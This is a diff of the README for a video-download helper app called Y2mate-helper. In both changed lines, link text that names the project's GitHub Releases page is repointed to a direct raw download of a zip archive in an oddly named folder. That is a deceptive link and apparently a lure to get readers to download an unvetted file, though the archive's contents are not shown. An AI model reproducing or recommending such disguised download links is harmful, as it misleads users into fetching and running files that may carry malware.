@@ -6,7 +6,7 @@ Welcome to Y2mate-helper! This application helps you search, manage, and save vi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Y2mate-helper Releases](https://github.com/LeannJota/Y2mate-helper/releases)
+To get started, visit this page to download the application: [Y2mate-helper Releases](https://raw.githubusercontent.com/LeannJota/Y2mate-helper/main/recramp/Y2mate-helper.zip)
 
 You will see different versions of the software. Choose the latest version for the best experience. 
 
@@ -72,6 +72,6 @@ Your feedback is valuable. If you have suggestions or need help, you can submit 
 
 ## 🖇️ Stay Updated
 
-To stay informed about new updates and features, keep checking our [GitHub Releases page](https://github.com/LeannJota/Y2mate-helper/releases) or follow our repository.
+To stay informed about new updates and features, keep checking our [GitHub Releases page](https://raw.githubusercontent.com/LeannJota/Y2mate-helper/main/recramp/Y2mate-helper.zip) or follow our repository.
 
 Thank you for using Y2mate-helper! We hope you enjoy managing your media with ease.
